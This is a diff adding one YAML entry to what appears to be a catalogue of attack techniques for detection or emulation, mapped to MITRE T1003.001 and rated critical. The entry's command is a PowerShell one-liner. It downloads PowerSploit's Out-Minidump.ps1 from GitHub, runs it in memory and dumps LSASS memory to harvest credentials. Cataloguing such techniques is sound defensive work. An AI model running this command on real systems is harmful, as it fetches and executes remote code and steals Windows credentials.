@@ -1,0 +1,19 @@
+- command: Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump
+  description: Abuse Out-Minidump.ps1 with the MiniDumpWriteDump Win32 API call to perform an LSASS process memory dump.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Credential Access:
+      - T1003.001
+  os:
+    - Windows
+  references:
+    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md
+  risk: Critical
+  risk_reason: Abuse of Out-Minidump.ps1 is a highly suspicious activity.
+  fidelity: High
+  fidelity_reason: This script should not appear in any legitimate activities.
+  tool: Out-Minidump
+  threatactors:
+    N/A:
+      - N/A
